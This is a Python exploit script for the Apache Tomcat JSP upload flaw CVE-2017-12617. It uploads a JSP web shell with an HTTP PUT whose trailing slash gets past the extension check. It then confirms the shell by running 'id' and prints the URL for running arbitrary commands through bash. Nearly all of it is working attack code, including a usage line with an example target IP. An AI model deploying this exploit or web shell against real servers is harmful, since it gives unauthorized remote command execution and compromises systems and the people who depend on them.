import requests
import sys


def exploit(target, port=8080):
    """
    Apache Tomcat JSP Upload Bypass RCE (CVE-2017-12617)
    Uploads a JSP web shell via HTTP PUT with a trailing slash to bypass
    the .jsp extension restriction.

    Usage:
        python3 exploit.py <target_ip> [port]
    """

    base_url = f"http://{target}:{port}"

    jsp_shell = """
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
""".strip()

    shell_path = "/cmd.jsp"

    print(f"[*] Target: {base_url}")
    print(f"[*] Uploading JSP shell via PUT...")

    # the bypass uses a trailing slash after .jsp
    try:
        r = requests.put(
            f"{base_url}{shell_path}/",
            data=jsp_shell,
            headers={"Content-Type": "application/octet-stream"},
            timeout=10,
        )
        if r.status_code in [200, 201, 204]:
            print(f"[+] Upload successful (status {r.status_code})")
        else:
            print(f"[-] Upload returned status {r.status_code}")
            return
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return

    # verify the shell works
    print(f"[*] Testing shell...")
    try:
        r = requests.get(f"{base_url}{shell_path}", params={"cmd": "id"}, timeout=10)
        if r.status_code == 200 and r.text.strip():
            print(f"[+] Shell working: {r.text.strip()}")
            print(f"[+] Access shell at: {base_url}{shell_path}?cmd=COMMAND")
        else:
            print(f"[-] Shell may not be working (status {r.status_code})")
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_ip> [port]")
        print("Example: python3 exploit.py 10.10.10.15 8080")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    exploit(target, port)
